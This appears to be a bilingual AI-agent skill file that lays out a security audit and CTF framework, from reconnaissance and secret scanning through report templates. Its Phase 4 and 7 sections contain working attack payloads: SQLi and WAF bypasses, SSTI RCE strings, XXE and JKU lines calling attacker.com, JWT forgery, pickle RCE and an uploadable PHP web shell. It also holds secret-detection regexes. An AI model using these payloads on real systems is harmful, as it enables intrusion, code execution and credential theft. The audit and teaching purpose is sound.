# 🛡️ Freebuff Security Analysis Framework

> 整合自多個頂級安全審計 Skills + CTF 攻防實戰技巧的統一框架

---

## 📋 Framework Overview

本框架整合了以下 Skills 的最佳實踐：

| Skill | 用途 | 重點 |
|-------|------|------|
| **Security Review** | 全面漏洞掃描 | 資料流追蹤、跨檔案分析 |
| **Sharp Edges** | 危險設計模式 | API 誤用、不安全預設值 |
| **Insecure Defaults** | 預設值審計 | 配置安全、fail-open 問題 |
| **Security Audit** | 深度滲透測試 | 可利用性驗證、攻擊鏈 |
| **CTF Web** | Web 攻防實戰 | 高級 SQLi、SSTI、SSRF、XXE、JWT、文件上傳 RCE |
| **CTF Pwn** | 二進位漏洞利用 | 緩衝區溢位、ROP、格式化字串、堆利用 |
| **CTF Crypto** | 密碼學攻擊 | RSA/ECC 攻擊、Padding Oracle、PRNG 弱點 |
| **CTF Forensics** | 數位鑑識 | 記憶體/磁碟/網路取證、隱寫術 |
| **CTF Reverse** | 逆向工程 | 反分析對抗、混淆代碼分析 |

---

## 🎯 Core Principles

### 1. 只報告可利用的漏洞
```
❌ "An attacker could theoretically..."
✅ "Send this request → get this result"
```

### 2. 動態驗證優先
- 能建構 PoC 就建構
- 能跑測試就跑測試
- 靜態分析 + 動態驗證 = 確認

### 3. 嚴重性需要影響
| 嚴重性 | 條件 | 範例 |
|--------|------|------|
| 🔴 CRITICAL | 未認證 RCE、完整資料庫洩漏 | SQLi、RCE、auth bypass |
| 🟠 HIGH | 認證後 RCE、stored XSS | IDOR、hardcoded secrets |
| 🟡 MEDIUM | 條件式漏洞 | CSRF、open redirect |
| 🔵 LOW | 資訊洩露、最佳實踐違規 | verbose errors |
| ⚪ INFO | 觀察性發現 | 過時依賴 |

### 4. Defense-in-depth ≠ 漏洞
如果 Layer A 已經阻止攻擊，Layer B 缺失只是 hardening note

---

## 🔍 Phase 1: Reconnaissance（偵察）

### 目標
- 識別應用程式類型和架構
- 找出信任邊界和輸入表面
- 建立攻擊面地圖

### Step 1.1 — 技術棧識別
```bash
# 檢查語言和框架
find . -name "package.json" -o -name "requirements.txt" -o -name "go.mod" -o -name "Cargo.toml" -o -name "composer.json"

# 檢查部署配置
find . -name "Dockerfile" -o -name "docker-compose.yml" -o -name "*.yaml" -o -name "*.yml"

# 檢查環境配置
find . -name ".env*" -o -name "config.*" -o -name "settings.*"
```

### Step 1.2 — 入口點映射
識別所有外部可達的端點：
- HTTP handlers/routes
- CLI arguments
- File upload/download
- Message queues
- WebSocket endpoints
- Database triggers

### Step 1.3 — 信任邊界繪製
```
外部用戶 → [驗證邊界] → 認證用戶 → [授權邊界] → 特權操作
```

### Step 1.4 — 隱藏功能偵察（CTF Web 技巧）
```bash
# 常見隱藏路徑
curl -sI https://target.com
curl -s https://target.com/robots.txt
curl -s https://target.com/.well-known/
curl -s https://target.com/.git/HEAD
curl -s https://target.com/.env

# JS bundle 搜尋隱藏 API
grep -oE '"/api/[^"]+"' bundle.js

# 嘗試不同 HTTP 方法和 Content-Type
curl -X TRACE https://target.com/
curl -X POST https://target.com/ -H "Content-Type: application/xml" -d '<test/>'
```

---

## 🔍 Phase 2: Dependency Audit（依賴審計）

### 快速勝利 — 已知漏洞

| 語言 | 檔案 | 工具 |
|------|------|------|
| Node.js | package.json, package-lock.json | `npm audit`, `snyk` |
| Python | requirements.txt, pyproject.toml | `pip-audit`, `safety` |
| Go | go.sum | `govulncheck` |
| Rust | Cargo.toml, Cargo.lock | `cargo-audit` |
| PHP | composer.json, composer.lock | `composer audit` |
| Java | pom.xml, build.gradle | `dependency-check` |

### 檢查項目
- [ ] 已知 CVE
- [ ] 過時/棄用的加密庫
- [ ] 可疑的 pinned 版本
- [ ] 供應鏈風險

---

## 🔍 Phase 3: Secrets & Exposure Scan（機密掃描）

### 3.1 — 硬編碼機密
```regex
# API Keys & Tokens
(api[_-]?key|apikey|secret[_-]?key|access[_-]?token|auth[_-]?token)\s*[=:]\s*['"][^'"]+['"]

# AWS
(AKIA|ASIA)[A-Z0-9]{16}

# Private Keys
-----BEGIN (RSA |EC )?PRIVATE KEY-----

# Connection Strings
(mysql|postgres|mongodb|redis)://[^'"]*:[^'"]*@
```

### 3.2 — 環境檔案洩露
```bash
# 檢查 .env 是否被提交
git ls-files | grep -E '\.env$|\.env\.'

# 檢查 .gitignore 是否正確
cat .gitignore | grep -E '\.env|secret|key|credential'
```

### 3.3 — 設定檔案中的機密
```bash
# Docker
grep -r "ENV.*PASSWORD\|ENV.*SECRET\|ENV.*KEY" Dockerfile*

# CI/CD
grep -r "secrets\.\|credentials\." .github/ .gitlab-ci.yml .circleci/
```

---

## 🔍 Phase 4: Vulnerability Deep Scan（深度掃描）

### 4.1 — Injection Flaws（注入漏洞）

#### SQL Injection（基礎）
```python
# ❌ 危險
cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")
cursor.execute("SELECT * FROM users WHERE id = '%s'" % user_id)

# ✅ 安全
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
```

#### SQL Injection — 進階攻擊技巧（CTF Web）

**WAF Bypass 技巧：**
```bash
# XML Entity Encoding 繞過 WAF
<storeId>1 &#x55;&#x4e;&#x49;&#x4f;&#x4e; &#x53;&#x45;&#x4c;&#x45;&#x43;&#x54; username &#x46;&#x52;&#x4f;&#x4d; users</storeId>

# Backslash Escape Quote Bypass
curl -X POST http://target/login -d 'username=\\&password= OR 1=1-- '

# Hex Encoding 繞過引號
SELECT 0x6d656f77;  -- Returns 'meow'

# 雙關鍵字過濾繞過（單次移除 bypass）
# sselectelect -> 移除一次 -> select
), ((selselectect * frofromm flags as a limit 0, 1), '2') #

# BETWEEN 運算子 Tautology（繞過數字和比較運算子過濾）
id BETWEEN id AND id UNION SELECT flag,2,3 FROM flags--
```

**二次注入（Second-Order SQLi）：**
```python
# 1. 儲存惡意資料（未觸發）
s.post("https://target.com/register", data={
    "username": "admin'-- -",
    "user_credential": "placeholder_val"
})

# 2. 觸發時執行（從 DB 讀取後未轉義使用）
s.post("https://target.com/change-credential", data={
    "old_credential": "placeholder_val",
    "new_credential": "updated_target"
})
# UPDATE users SET auth_hash='updated_target' WHERE username='admin'-- -'
```

**INSERT ON DUPLICATE KEY UPDATE 欄位覆寫：**
```python
# 當 SELECT 被 revoked 時，用 INSERT 覆寫目標欄位
payload = "'),('','root','z')ON DUPLICATE KEY UPDATE auth_hash='target_hash'#"
r = requests.post("http://target/register", data={"username": payload, "temp_code": "temp"})
```

**MySQL information_schema 替代方案：**
```sql
-- 當 information_schema 被封鎖時
SELECT group_concat(table_name) FROM mysql.innodb_table_stats WHERE database_name=database()
```

**Host Header SQL Injection：**
```bash
curl -H "Host: ' UNION SELECT table_name,2,3 FROM information_schema.tables-- " http://target/
```

**ProcessList Race Condition 洩露：**
```sql
-- 從 concurrent query 洩露 secrets
SELECT info FROM information_schema.processList WHERE id=connection_id()
```

**SQLi to SSTI Chain：**
```python
# SQL 注入結果在模板中渲染
payload = "{{self.__init__.__globals__.__builtins__.__import__('os').popen('/readflag').read()}}"
hex_payload = '0x' + payload.encode().hex()
```

#### Command Injection
```python
# ❌ 危險
os.system(f"ping {user_input}")
subprocess.call("ping " + user_input, shell=True)

# ✅ 安全
subprocess.run(["ping", user_input], shell=False)
```

**進階 Command Injection 技巧：**
```bash
# 分號、管線、反引號、$()
; id          | id          `id`          $(id)
%0aid         # Newline     127.0.0.1%0acat /flag

# Bash brace expansion（無空格注入）
{ls,-la,..}  # 展開為 ls -la ..

# 當 cat 被封鎖時
sed -n p flag.txt
awk '{print}' flag.txt
tac flag.txt
```

#### XSS
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

**進階 XSS 繞過：**
```html
<!-- Hex encoding -->
\x3cscript\x3ealert(1)\x3c/script\x3e

<!-- HTML entities -->
&#60;script&#62;alert(1)&#60;/script&#62;

<!-- Case mixing -->
<ScRiPt>alert(1)</ScRiPt>

<!-- DOM XSS via jQuery hashchange -->
<iframe src="javascript:alert(1)">
```

#### SSTI — Server-Side Template Injection

**Detection：**
```bash
curl "https://target.com/page?name={{7*7}}"  # Returns 49 = vulnerable
```

**多模板引擎 RCE：**
```python
# Jinja2 (Python)
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Twig (PHP)
{{['id']|map('system')|join}}

# Mako (Python)
${__import__('os').popen('id').read()}

# EJS (Node.js)
<%- global.process.mainModule.require('child_process').execSync('id') %>

# ERB (Ruby)
<%= Sequel::DATABASES.first[:table].all %>

# Thymeleaf SpEL (Java/Spring)
${T(java.lang.Runtime).getRuntime().exec('id')}
${T(org.springframework.util.FileCopyUtils).copyToByteArray(new java.io.File("/flag.txt"))}

# Go Template
{{.ReadFile "/flag.txt"}}
```

**Twig vs Jinja2 辨識：**
```
{{7*'7'}}  # Twig = "7777777" (字串重複), Jinja2 = 49 (數字乘法)
```

**Quote Filter Bypass：**
```python
# 使用 keyword arguments 繞過引號過濾
{{obj.__dict__.update(attr=value) or obj.name}}
```

#### XXE — XML External Entity

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

<!-- PHP filter 讀取原始碼 -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">

<!-- OOB (Out-of-Band) -->
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>
```

**DOCX Upload XXE：**
DOCX 是 ZIP+XML；在 `[Content_Types].xml` 中注入 XXE。

#### Path Traversal / LFI
```text
../../../etc/passwd
....//....//....//etc/passwd     # Filter bypass
..%2f..%2f..%2fetc/passwd        # URL encoding
%252e%252e%252f                  # Double URL encoding
{.}{.}/flag.txt                  # Brace stripping bypass
```

**進階技巧：**
```bash
# /dev/fd symlink bypass（繞過 /proc 封鎖）
/dev/fd/../environ  # /dev/fd symlink 到 /proc/self/fd

# Python os.path.join footgun
os.path.join('/app/public', '/etc/passwd')  # 返回 /etc/passwd
```

### 4.2 — Authentication & Access Control

#### 檢查清單
- [ ] 缺少認證的敏感端點
- [ ] BOLA/IDOR（物件層級授權失效）
- [ ] JWT 弱點（alg:none、弱密鑰、無過期驗證）
- [ ] Session fixation
- [ ] 缺少 CSRF 保護
- [ ] 權限提升路徑

#### JWT 攻擊 — 完整技巧（CTF Web）

```python
# alg:none 攻擊
import base64, json
header = base64.b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode())
payload = base64.b64encode(json.dumps({"user_id": 1, "admin": True}).encode())
unsigned_jwt = f"{header}.{payload}."  # 空簽名
```

**Algorithm Confusion (RS256 → HS256)：**
- **攻擊原理**：伺服器若同時接受非對稱（RS256）與對稱（HS256）演算法，攻擊者可取得伺服器公開公鑰字串，將 JWT 標頭演算法欄位切換為 `HS256`，並以該公鑰內容作為 HMAC 對稱金鑰重新計算雜湊簽章完成偽造。
- **自動化驗證**：
```bash
python3 -m jwt_tool <TARGET_TOKEN> -X a -pk public.pem
```

**Weak Secret Brute-Force：**
```bash
flask-unsign --decode --cookie "eyJ..."
hashcat -m 16500 jwt.txt wordlist.txt
```

**JWK Header Injection：**
```python
# 伺服器接受 JWT header 中嵌入的 JWK，用攻擊者金鑰簽名
from cryptography.hazmat.primitives.asymmetric import rsa
rsa_key_pair = rsa.generate_private_key(65537, 2048, default_backend())
# 將公鑰嵌入 JWT header 的 jwk 欄位
forged = jwt.encode({"sub": "administrator"}, rsa_key_pair, algorithm='RS256', headers={'jwk': attacker_jwk})
```

**KID Path Traversal：**
```python
# KID 用於檔案路徑，指向 /dev/null（空金鑰）
forged = jwt.encode({"sub": "administrator"}, '', algorithm='HS256', headers={"kid": "../../../dev/null"})
# 變體：SQL injection in KID
# ' UNION SELECT 'known-secret' --
```

**JKU Header Injection（SSRF + Token Forgery）：**
```python
# 伺服器從 JWT 指定的 URL 取得公鑰
forged = jwt.encode({"sub": "administrator"}, attacker_key, 
    algorithm='RS256', headers={'jku': 'https://attacker.com/.well-known/jwks.json'})
```

**JWE Token Forgery：**
```python
# JWE 是加密的（非簽名），有公鑰就能偽造
from jwcrypto import jwk, jwe
key = jwk.JWK.from_pem(public_key_pem.encode())
jwe_obj = jwe.JWE(json.dumps({"sub": "attacker", "role": "admin"}).encode(), recipient=key)
forged_jwe = jwe_obj.serialize(compact=True)
```

**JWT Balance Replay：**
```
1. 註冊 → 取得 JWT (balance=$100)，儲存此 JWT
2. 購買物品 → balance 歸零
3. 替換 cookie 為儲存的 JWT (balance 恢復 $100)
4. 退還物品 → 伺服器將價格加入 JWT 的 $100 balance
5. 重複直到 balance 超過目標價格
```

#### OAuth / SAML / OIDC 攻擊
- OAuth redirect URI 競爭
- SAML Assertion 簽名繞過
- OIDC State/Nonce 重放
- Token Exchange 攻擊

#### Session 安全
- Session fixation
- Session hijacking via XSS
- Cookie 屬性檢查（HttpOnly, Secure, SameSite）

### 4.3 — Business Logic（業務邏輯）

#### 狀態機違規
- 能否跳過步驟？
- 能否回退到先前狀態？
- 重放已完成的流程會怎樣？

#### 競態條件（Race Conditions）
```
Thread 1: check_balance() → 100
Thread 2: check_balance() → 100
Thread 1: withdraw(100) → success
Thread 2: withdraw(100) → success (但餘額不足!)
```

```python
# 競態條件利用
import threading
def race():
    requests.get("http://target/redeem?code=COUPON1")
threads = [threading.Thread(target=race) for _ in range(50)]
for t in threads: t.start()
for t in threads: t.join()
```

#### 數值操縱
- 負值檢查
- 零值處理
- 整數溢位
- 精度損失

### 4.4 — Cryptography（加密）

#### 弱加密
```python
# ❌ 弱
hashlib.md5(password)
hashlib.sha1(token)
DES.new(key)

# ✅ 強
bcrypt.hashpw(password, bcrypt.gensalt())
hashlib.sha256(token)
AES.new(key, AES.MODE_GCM)
```

#### 弱隨機數
```python
# ❌ 弱
import random
session_entropy = random.randint(0, 2**32)

# ✅ 強
import secrets
session_entropy = secrets.token_urlsafe(32)
```

#### 密碼學攻擊模式（CTF Crypto）

**RSA 常見弱點：**
```python
# Small e (cube root attack)
from Crypto.Util.number import long_to_bytes
m = int(pow(c, 1/3))  # e=3 時

# Wiener's Attack（小私鑰 d）
# 當 d < N^0.25 / 3 時可攻擊

# Common Modulus Attack
# 同一 N 不同 e 加密同一明文

# Hastad's Broadcast Attack
# 同一明文用不同 N 相同小 e 加密

# Bleichenbacher Padding Oracle (ROBOT)
# PKCS#1 v1.5 padding oracle 可解密

# 共享質數（批量 GCD）
from math import gcd
for i in range(len(keys)):
    for j in range(i+1, len(keys)):
        g = gcd(keys[i], keys[j])
        if g > 1:
            # g 是共享質數，可分解
```

**AES 攻擊模式：**
```python
# ECB Mode — Byte-at-a-time
# 相同明文區塊產生相同密文區塊

# CBC Padding Oracle
# 透過 padding error 判斷明文

# AES-GCM Nonce Reuse (Forbidden Attack)
# 同一 nonce 加密不同明文 → XOR 兩個密文 = XOR 兩個明文

# CFB-8 Mode — 位元組洩漏
# 每個位元組的密文洩漏明文資訊
```

**PRNG 弱點：**
```python
# Mersenne Twister (MT19937) — 狀態恢復
# 觀察 624 個 32-bit 輸出可恢復完整內部狀態

# LCG — 模線性同餘生成器
# 觀察幾個輸出可預測後續值

# 時間種子
import time
import random
random.seed(int(time.time()))  # 可暴力猜測種子
```

**Padding Oracle 攻擊：**
```python
# CBC Padding Oracle — 逐位元組解密
def padding_oracle(ciphertext):
    # 修改前一個區塊的位元組
    # 觸發 padding error → 該位元組值正確
    # 不觸發 → 該位元組值錯誤
    # 透過 256 次嘗試可確定每個位元組
    pass
```

### 4.5 — File Upload to RCE（CTF Web）

**.htaccess Upload Bypass：**
```
1. Upload .htaccess: AddType application/x-httpd-php .lol
2. Upload rce.lol: <?php system($_GET['cmd']); ?>
3. Access rce.lol?cmd=cat+flag.txt
```

**PHP Log Poisoning：**
```
1. PHP payload 在 User-Agent header
2. Path traversal include: ....//....//....//var/log/apache2/access.log
```

**Python .so Hijacking：**
```bash
# 編譯惡意 shared object
gcc -shared -fPIC -o auth.so malicious.c  # with __attribute__((constructor))

# Path traversal 上傳
{"filename": "../utils/auth.so"}

# 刪除 .pyc 強制重新 import
{"filename": "../utils/__pycache__/auth.cpython-311.pyc"}
```

**ZipSlip + SQLi：**
上傳包含 symlinks 的 ZIP 檔案實現檔案讀取，path traversal 實現檔案寫入。

**PNG/PHP Polyglot Upload：**
有效 PNG 檔案在 IEND chunk 後附加 `<?php`，上傳為 `.png.php`。

### 4.6 — Deserialization Attacks（反序列化攻擊）

**Java Deserialization：**
```python
# 序列化物件標記: rO0AB / aced0005
# ysoserial gadget chains → RCE via ObjectInputStream.readObject()
# 常用 gadgets: CommonsCollections1-7, URLDNS (blind detection)
```

**Python Pickle Deserialization：**
```python
# pickle.loads() 呼叫 __reduce__() → RCE
import pickle, os
class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))
payload = pickle.dumps(Exploit())
# 也透過 yaml.load(), torch.load(), joblib.load() 觸發
```

**PHP Deserialization：**
```php
// POP Chain: 構造序列化物件觸發危險函數
O:8:"FilePath":1:{s:4:"path";s:8:"flag.txt";}
// 也透過 extract($_GET) 實現變數覆寫
```

### 4.7 — Request Smuggling（請求走私）

```bash
# CL.TE (Content-Length vs Transfer-Encoding 不一致)
# 前端看 Content-Length，後端看 Transfer-Encoding

# TE.CL
# 前端看 Transfer-Encoding，後端看 Content-Length

# TE.TE
# 兩者都看 TE，但通過 obfuscation 繞過過濾
```

### 4.8 — Node.js 特定漏洞

**Prototype Pollution：**
```javascript
// 透過 __proto__ 汙染 Object.prototype
{"__proto__": {"isAdmin": true}}
// 也用 flatnest circular ref bypass
```

**VM Escape：**
```javascript
this.constructor.constructor("return process")()  // → RCE
```

**完整攻擊鏈：**
```
Pollution → Enable JS eval in Happy-DOM → VM escape → RCE
```

### 4.9 — PHP 特定漏洞

**Type Juggling：**
```php
// 鬆散比較 == 執行型別轉換
0 == "string"        // true
"0e123" == "0e456"   // true (magic hashes)
strcmp([], "str")     // 返回 NULL，通過 !strcmp() 檢查

// 利用：發送 JSON integer 0 繞過字串密碼檢查
```

**PHP File Inclusion / LFI：**
```php
// php://filter 讀取原始碼
php://filter/convert.base64-encode/resource=config

// Null byte truncation (PHP < 5.3.4)
/etc/passwd%00
```

**PHP eval() Function-Regex Bypass：**
```php
// current(getallheaders()) 通過正則檢查，返回攻擊者控制的 header 值
eval(current(getallheaders()));
// 配合 header: Zzz: system('cat /flag');
```

---

## 🔍 Phase 5: Sharp Edges Analysis（銳利邊緣分析）

### 核心原則：成功之 pit
安全用法應該是阻力最小的路徑。

### 5.1 — 演算法選擇陷阱
```php
// ❌ 危險：允許弱演算法
hash($algorithm, $password);  // 接受 "crc32"

// ✅ 安全：無選擇
password_hash($password, PASSWORD_DEFAULT);
```

### 5.2 — 危險預設值
```python
# ❌ 危險：0 的意義不明
def verify_otp(code, lifetime=300):
    if lifetime == 0:
        return True  # 0 = 接受所有？

# ✅ 安全：明確的預設值
def verify_otp(code, lifetime=300):
    if lifetime <= 0:
        raise ValueError("lifetime must be positive")
```

### 5.3 — 配置懸崖
```yaml
# ❌ 危險：一個設定錯誤就災難
verify_ssl: false
session_timeout: -1  # 永不過期？

# ✅ 安全：驗證配置
require:
  - verify_ssl: true
  - session_timeout: [1, 86400]  # 範圍驗證
```

### 5.4 — 靜默失敗
```python
# ❌ 危險：無金鑰時靜默通過
def verify_signature(sig, data, key):
    if not key:
        return True  # 沒有金鑰 = 跳過驗證？！

# ✅ 安全：明確失敗
def verify_signature(sig, data, key):
    if not key:
        raise ValueError("Verification key required")
```

---

## 🔍 Phase 6: Insecure Defaults Audit（不安全預設值審計）

### 6.1 — Fallback Secrets
- **❌ 危險**：使用非空預設回退值替代遺失的環境變數，導致生產環境金鑰缺失時靜默降級至已知固定字串。
- **✅ 安全**：核心安全參數必須在啟動階段進行嚴格校驗，缺少時立即引發異常並終止進程：
```python
APP_KEY = os.environ["APP_SIGNING_KEY"]  # 缺失時直接引發 KeyError 中斷啟動
```

### 6.2 — Fail-Open Switches
```python
# ❌ 危險
REQUIRE_AUTH = os.environ.get('REQUIRE_AUTH', 'false').lower() == 'true'

# ✅ 安全
REQUIRE_AUTH = os.environ.get('REQUIRE_AUTH', 'true').lower() == 'true'  # 預設開啟
```

### 6.3 — Permissive Access
```python
# ❌ 危險
CORS_ORIGINS = ["*"]
FILE_PERMISSIONS = 0o666

# ✅ 安全
CORS_ORIGINS = ["https://trusted-domain.com"]
FILE_PERMISSIONS = 0o600
```

### 6.4 — Debug Leakage
```python
# ❌ 危險
@app.errorhandler(500)
def handle_error(e):
    return traceback.format_exc(), 500  # 生產環境洩露堆疊

# ✅ 安全
@app.errorhandler(500)
def handle_error(e):
    logger.error(f"Internal error: {e}")
    return "Internal Server Error", 500
```

---

## 🔍 Phase 7: Binary & Native Service Analysis（二進位與原生服務分析）

> 從 CTF Pwn 技能整合，適用於審計原生 binary 服務、共享庫、系統程式

### 7.1 — 保護機制檢查
```bash
checksec --file=binary
file binary
readelf -h binary
```

| Protection | Status | Implication |
|-----------|--------|-------------|
| PIE | Disabled | 固定地址 — 可直接覆寫 GOT/PLT |
| RELRO | Partial | GOT 可寫 — GOT overwrite 攻擊可行 |
| RELRO | Full | GOT 只讀 — 需要替代目標（hooks, vtables） |
| NX | Enabled | 無法執行 stack/heap 上的 shellcode — 使用 ROP |
| Canary | Present | Stack smash 偵測 — 需要 leak 或避免 stack overflow |

**Quick Decision Tree：**
- Partial RELRO + No PIE → GOT overwrite（最簡單）
- Full RELRO → 目標 `__free_hook`, `__malloc_hook` (glibc < 2.34), return addresses
- Stack canary → 優先 heap-based attacks 或先 leak canary

### 7.2 — 常見漏洞模式
```c
// 緩衝區溢位
gets()                    // 永遠不安全
scanf("%s", buf)          // 無邊界檢查
strcpy(dst, src)          // 無邊界檢查

// 格式化字串
printf(user_input)        // %p, %x 可 leak stack，%n 可寫入

// 整數溢位
size_t len = user_input;  // 無符號整數，負值變大數
```

### 7.3 — Format String 攻擊
```python
# Leak stack values
%p.%p.%p.%p  # 洩露 stack 上的值

# GOT overwrite（任意寫入）
# printf(payload) 中 %n 寫入已處理的字元數到指定地址

# Canary leak
# %p 讀取 stack canary 值
```

### 7.4 — 堆利用基礎
- Use-After-Free (UAF)
- Double Free
- Heap Overflow
- House of Apple / Einherjar / Orange 等 technique

### 7.5 — ROP Chain 建構
```bash
# 查找 gadgets
ROPgadget --binary binary | grep "pop rdi"
ropper -f binary --search "pop rdi"
one_gadget /lib/x86_64-linux-gnu/libc.so.6

# 兩階段 ret2libc
# Stage 1: leak libc via puts@PLT(puts@GOT)
# Stage 2: system("/bin/sh")
```

### 7.6 — Race Condition 利用（Binary）
```bash
# 競態條件窗口利用
bash -c '{ echo "cmd1"; echo "cmd2"; sleep 1; } | nc host port'
```

---

## 🔍 Phase 8: Cross-File Data Flow（跨檔案資料流）

### 追蹤路徑
```
用戶輸入 → [驗證] → [轉換] → [儲存] → [檢索] → [輸出]
    ↓          ↓         ↓         ↓         ↓         ↓
  驗證點    注入點    編碼問題   SQLi    反序列化   XSS
```

### 檢查項目
- [ ] 使用者控制的輸入到達危險 sink
- [ ] 跨元件的信任假設
- [ ] 第二-order 攻擊
- [ ] 編碼/轉義不一致

---

## 🔍 Phase 9: Chained Attacks（攻擊鏈）

### 常見攻擊鏈模式（CTF Web 實戰）
```
Recon → Hidden route → Auth bypass → Internal file read → Token/flag
XSS/HTML injection → Admin bot → Privileged action → Secret leak
Traversal/Upload → Config/source leak → Secret recovery → Session forgery
SSRF → Metadata/internal API → Credential leak → Code execution
SQLi/NoSQL injection → Credential bypass → Template/upload abuse
Path traversal + ReDoS oracle → CRLF injection → Cache poisoning → XSS
```

### 跨元件信任缺口
```
元件 A 驗證輸入 → 傳給元件 B → B 信任 A → B 有不同假設 → 漏洞
```

### Second-Order 攻擊
```
儲存時安全的資料 → 在不同上下文中使用 → 變成危險
```

### SSRF → RCE 完整鏈
```
1. SSRF 觸發內部請求
2. 訪問 metadata endpoint (169.254.169.254)
3. 取得 IAM credentials
4. 使用 credentials 執行管理操作
```

---

## 🔍 Phase 10: Forensics & Incident Response（鑑識與事件響應）

> 從 CTF Forensics 技能整合，適用於事後分析和事件響應

### 10.1 — 記憶體取證
```bash
# Volatility 3
vol3 -f memory.dmp windows.info
vol3 -f memory.dmp windows.pslist
vol3 -f memory.dmp windows.filescan
vol3 -f memory.dmp windows.netscan
vol3 -f memory.dmp windows.dumpfiles --physaddr <addr>

# 字串搜尋
strings -a -n 6 memdump.bin | grep -E "FLAG|SSH_CLIENT|SESSION_KEY"
```

### 10.2 — 磁碟取證
```bash
# 掛載磁碟映像
sudo mount -o loop,ro image.dd /mnt/evidence

# 列出檔案
fls -r image.dd

# 復原已刪除檔案
photorec image.dd
testdisk image.dd
```

### 10.3 — 網路取證
```bash
# PCAP 分析
tshark -r capture.pcapng -Y "http"
tshark --export-objects http,/tmp/objects

# TLS 解密
# 將 SSLKEYLOGFILE 匯入 Wireshark (Edit → Preferences → Protocols → TLS)

# NTLMv2 hash cracking
# 從 PCAP 提取 server challenge + NTProofStr
hashcat -m 5600 ntlmv2.txt wordlist.txt
```

### 10.4 — Log Analysis
```bash
# 搜尋 flag fragments
grep -iE "(flag|part|piece|fragment)" server.log

# 重組分割的 flag
grep "FLAGPART" server.log | sed 's/.*FLAGPART: //' | uniq | tr -d '\n'

# 異常檢測
sort logfile.log | uniq -c | sort -rn | head
```

### 10.5 — Steganography Detection（隱寫術偵測）
```bash
# 基礎隱寫術檢測
steghide extract -sf image.jpg
zsteg image.png
stegsolve

# 頻率域分析
python3 -c "
import numpy as np
from PIL import Image
img = np.array(Image.open('image.png'))
fft = np.fft.fft2(img[:,:,0])
magnitude = np.log(np.abs(np.fft.fftshift(fft)) + 1)
Image.fromarray(magnitude.astype(np.uint8)).save('fft.png')
"

# EXIF 檢查
exiftool image.jpg
strings image.jpg | grep -i flag
```

### 10.6 — Browser Forensics
```bash
# Chrome/Edge — 解密 Login Data
# 使用 AES-GCM + DPAPI master key

# Firefox — 查詢歷史
sqlite3 places.sqlite "SELECT url FROM moz_places WHERE url LIKE '%flag%'"
```

### 10.7 — Docker Container Forensics
```bash
# Docker 映像分析
docker save <image> > image.tar
tar xf image.tar

# Config JSON 保留所有 RUN 指令
cat <layer>/json | python -m json.tool

# 歷史指令
docker history --no-trunc <image>
```

---

## 🔍 Phase 11: Reverse Engineering & Anti-Analysis（逆向工程與反分析）

> 從 CTF Reverse 技能整合，適用於分析混淆代碼和惡意軟體

### 11.1 — 反分析技術偵測
```bash
# 偵測 signal handler
strace -e signal ./binary

# 偵測 ptrace-based 反調試
strace -f -e trace=process_vm_writev ./binary

# 偵測反虛擬化
# 檢查 VM-specific 指令或硬體標誌
```

### 11.2 — 常見反分析技術
- **SIGILL Handler** — 透過 illegal instruction 切換執行模式
- **SIGFPE Side-Channel** — 透過 signal 數量作為 side-channel
- **Call-less Function Chaining** — 操縱 stack frame 連結函數
- **Parent-Patched Child** — 父行程在執行時重寫子行程代碼

### 11.3 — .NET 反混淆
```bash
# ConfuserEx — Constructor breakpoint dump
# 在 dnSpy 中 break on <Module> .cctor → 執行 → Save Module

# de4dot — 符號清理
de4dot out.exe
```

### 11.4 — 指令追蹤反轉
```python
# 算術混淆反轉（sub ↔ add, rol ↔ ror, xor 自反）
inverse_map = {'add': 'sub', 'sub': 'add', 'rol': 'ror', 'ror': 'rol', 'xor': 'xor'}
inverted = [(inverse_map.get(m, m), op) for m, op in reversed(transforms)]
```

---

## 📊 Reporting Format（報告格式）

### Findings Summary Table
| Severity | Count |
|----------|-------|
| 🔴 CRITICAL | X |
| 🟠 HIGH | X |
| 🟡 MEDIUM | X |
| 🔵 LOW | X |
| ⚪ INFO | X |
| **Total** | **X** |

### Finding Card
```markdown
## [SEVERITY] Finding Title

**File**: `path/to/file.py:L42`
**Confidence**: High/Medium/Low
**Category**: Injection / Access Control / Business Logic / etc.

### Vulnerable Code
```python
# exact vulnerable code snippet
```

### Attack Scenario
1. Attacker does X
2. System processes Y
3. Result: Z

### Impact
What damage can the attacker achieve?

### Remediation
```python
# fixed code
```

### References
- CWE-XXX
- OWASP Top 10
```

---

## 🚀 Quick Start Commands

### 全面掃描
```bash
# 1. 依賴審計
npm audit / pip-audit / go vuln / cargo audit

# 2. 機密掃描
grep -r "password\|secret\|api_key\|token" --include="*.py" --include="*.js" --include="*.go" .

# 3. SQL 注入檢查
grep -r "execute\|query\|raw\|format" --include="*.py" --include="*.js" .

# 4. 命令注入檢查
grep -r "os.system\|subprocess\|exec\|eval" --include="*.py" --include="*.js" .

# 5. 反序列化檢查
grep -r "unserialize\|pickle.loads\|yaml.load\|torch.load" --include="*.py" --include="*.php" .

# 6. 檔案上傳檢查
grep -r "move_uploaded_file\|shutil.move\|os.rename" --include="*.py" --include="*.php" --include="*.js" .
```

### CTF 攻防快速命令
```bash
# Web Recon
ffuf -u https://target.com/FUZZ -w wordlist.txt
sqlmap -u "https://target.com/page?id=1" --batch --dbs
echo '<token>' | cut -d. -f2 | base64 -d 2>/dev/null | jq .

# Binary Analysis
checksec --file=binary
ROPgadget --binary binary | grep "pop rdi"
python3 -c "from pwn import *; print(cyclic(200))"

# Crypto Analysis
python3 -c "from Crypto.Util.number import *; n=<N>; print(f'bits={n.bit_length()}')"
hashcat -m 16500 jwt.txt wordlist.txt

# Forensics
vol3 -f memory.dmp windows.pslist
exiftool suspicious_file
binwalk suspicious_file
steghide extract -sf image.jpg
```

---

## 📚 Reference Files

- `references/vuln-categories.md` — 漏洞分類詳細參考
- `references/secret-patterns.md` — 機密模式正則表達式
- `references/language-patterns.md` — 語言特定漏洞模式
